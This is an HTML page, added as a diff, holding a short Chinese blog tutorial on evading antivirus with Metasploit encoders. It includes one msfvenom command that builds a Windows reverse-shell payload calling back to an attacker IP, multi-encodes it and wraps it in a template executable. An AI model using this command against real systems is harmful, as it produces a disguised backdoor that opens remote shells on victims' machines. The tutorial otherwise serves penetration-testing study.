@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>Metasploit免杀技术 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit免杀技术"><span class="toc-text">Metasploit免杀技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#编码器"><span class="toc-text">编码器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用命令简介"><span class="toc-text">常用命令简介</span></a></li></ol></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit免杀技术</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">langke</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 24, 2018&nbsp;&nbsp;09:17:48</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h1 id="Metasploit免杀技术"><a href="#Metasploit免杀技术" class="headerlink" title="Metasploit免杀技术"></a>Metasploit免杀技术</h1><blockquote>
+<p>在进行渗透测试时，最尴尬的事莫过于被杀毒软件给检测出来<br>这也是一个很容易被忽视的细节。<br>如果事先没有做好计划进行免杀处理，很可能会惊动目标。<br>大多数杀毒软件使用特征码来识别恶意代码。</p>
+</blockquote>
+<a id="more"></a>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Metasploit/peitu_.png" alt></p>
+<blockquote>
+<p>我们的重点不是记住一些特定的命令，而是要掌握免杀处理方法的概念。<br>我们要弄清楚哪些操作可能会触发杀毒软件报警，<br>最重要的是多常识和实验</p>
+</blockquote>
+<h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><blockquote>
+<p>避免被查杀的最佳方法之一是使用MSF编码器对攻击载荷文件编码</p>
+</blockquote>
+<h3 id="常用命令简介"><a href="#常用命令简介" class="headerlink" title="常用命令简介"></a>常用命令简介</h3><ul>
+<li><code>-e</code>指定编码方式</li>
+<li><code>-i</code>指定编码次数</li>
+<li><code>-f</code>指定输出格式</li>
+<li><code>-a</code>指定使用的结构</li>
+<li><code>--platform</code>指定攻击负载的平台</li>
+<li><code>-p</code>指定payload</li>
+<li><code>-x</code>指定一个自定义可执行的文件作为一个模板</li>
+</ul>
+<blockquote>
+<p><strong>示例</strong><br>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.130<br> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom<br>-a x86 –platform windows -e x86/alpha_upper -i 2 -f raw<br>| msfvenom -a x86 –platform windows -e x86/shikata_ga_nai<br>-i 5 -f exe -x HipsMain.exe &gt; shellk.exe</p>
+</blockquote>
+<blockquote>
+<p><strong>命令讲解</strong><br><code>-p</code>使用payload<code>windows/shell_reverse_tcp</code><br><code>LHOST=192.168.11.130</code>反弹shell地址（攻击者ip）<br><code>LPORT=4444</code>反弹shell端口（攻击者主机端口）<br><code>-e</code>使用编码方式<code>x86/shikata_ga_nai</code><br><code>-i</code>编码次数<code>5</code>次<br><code>-f</code>指定输出文件格式<code>raw</code><br><code>|</code>前面的输出作为后面的输入,一般用在对payload进行多种编码。<br><code>-a</code>指定架构<code>x86</code><br><code>--platform</code>指定攻击负载的平台为<code>windows</code><br><code>-x</code>指定模板<code>HipsMain.exe</code><br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Metasploit/zidingyi.png" alt="moban"></p>
+</blockquote>
+<p>我在本地试了下，好像没什么用。</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>langke</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/10/24/Metasploit免杀技术/">http://yoursite.com/2018/10/24/Metasploit免杀技术/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="https://langkexiansheng">Langke</a></span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/msf专题/"># msf专题</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/10/29/爬取src资产/">爬取src资产</a>
+            
+            
+            <a class="next" rel="next" href="/2018/10/17/针对性扫描-Metasploit/">针对性扫描-Metasploit</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
